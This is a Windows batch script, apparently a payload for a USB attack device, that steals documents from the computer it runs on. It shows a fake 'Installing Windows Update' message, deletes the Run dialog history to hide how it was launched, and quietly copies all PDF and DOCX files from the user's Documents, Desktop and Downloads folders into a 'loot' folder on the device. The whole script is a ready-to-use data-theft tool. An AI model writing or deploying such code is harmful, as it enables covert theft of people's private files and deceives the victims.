@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Set the location
set dst=%~dp0\..\..\loot\USB_Exfiltration\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul

if Exist %USERPROFILE%\Documents (
REM /C Continues copying even if errors occur.
REM /Q Does not display file names while copying.
REM /G Allows the copying of encrypted files to destination that does not support encryption.
REM /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
REM /E Copies directories and subdirectories, including empty ones.

REM Add more of the line below specifying the location and file type
REM The below example grabs all .pdf files from the user's documents folder
REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul

xcopy /C /Q /G /Y %USERPROFILE%\Documents\*.pdf %dst% >>nul
xcopy /C /Q /G /Y %USERPROFILE%\Documents\*.docx %dst% >>nul
)

if Exist %USERPROFILE%\Desktop (
xcopy /C /Q /G /Y %USERPROFILE%\Desktop\*.pdf %dst% >>nul
xcopy /C /Q /G /Y %USERPROFILE%\Desktop\*.docx %dst% >>nul
)

if Exist %USERPROFILE%\Downloads (
xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.pdf %dst% >>nul
xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.docx %dst% >>nul
)

@cls
@exit
